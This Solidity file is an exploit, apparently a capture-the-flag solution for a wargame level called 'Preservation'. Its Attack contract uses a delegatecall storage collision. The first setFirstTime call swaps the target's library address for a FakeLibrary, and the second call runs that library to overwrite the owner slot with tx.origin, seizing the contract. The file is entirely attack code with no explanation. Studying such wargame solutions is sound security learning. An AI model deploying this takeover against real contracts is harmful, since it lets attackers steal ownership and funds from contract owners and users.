//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract FakeLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) external {
        owner = tx.origin;
    }
}

contract Attack {
    constructor(IPreservation preservation) payable {
        // update the address of the library with ours
        preservation.setFirstTime(uint160(address(new FakeLibrary())));
        // delegatecall our library
        preservation.setFirstTime(0);
    }
}
